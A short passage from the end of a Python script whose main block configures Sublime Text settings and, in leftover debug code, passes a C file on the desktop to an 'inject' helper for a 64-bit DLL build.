        print('[*] first file must be a dll.c file.')
    if len(argv) > 1:
        file = argv[1]
        inject(file, '64')

if __name__ == '__main__':
    # execute()
    # install('sublime')
    # remove('sublime')
    sublime_user_config()
    exit()

    is_debugger = True
    testc = os.path.join(os.path.expanduser("~"),'Desktop','test.c')
    # _make_bit_dll_file(testc)
    inject(testc)

    pass
